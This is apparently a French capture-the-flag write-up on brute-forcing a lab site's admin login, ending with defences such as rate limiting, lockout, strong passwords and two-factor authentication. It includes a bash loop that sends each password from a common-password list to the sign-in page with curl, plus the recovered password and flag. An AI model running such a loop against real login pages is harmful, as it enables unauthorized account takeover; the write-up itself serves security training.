télécharger un dictionnaire de mot de passe courant
je choisis celui-ci : https://github.com/tarraschk/richelieu le franch_password_top1000.txt

je copie de contenue dans un fichier 'dictionnaire'

ensuite, nous allons automatiser les essaies de connection avec un script qui appelle curl avec ses mots de passe pour essayer d'avoir un acces Administrateur au site.

avec une petite boucle sur dictionnaire: 

#!/bin/bash
for i in $(cat dictionnaire)
        do
                curl -X POST "http://192.168.156.114/index.php?page=signin&username=admin&password=$i&Login=Login#" | grep 'flag'>>result.txt
if grep 'flag' ./result.txt
then
  echo "Password: $i">>result.txt
  exit
else
  echo "not $i"
fi
done

après un long moment on trouve le mot de passe: shadow
et le flag : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

Cette faille est difficile à protéger complêtement car lié à l'utilisation des humains (dev où utilisateurs). On peut mettre en place certaines solutions pour rallonger la durée du brut force comme limité le nombre de requete par minutes, bloquer l'acces au bout de 3 echecs, forcer les utilisateurs à se servir de mots de passe dit 'fort' contenant lettre Maj et Min, chiffre et charactère spéciaux. 
Le plus efficace reste encore l'authentification à 2 facteurs mais cette dernière reste au bon vouloir des utilisateurs. 
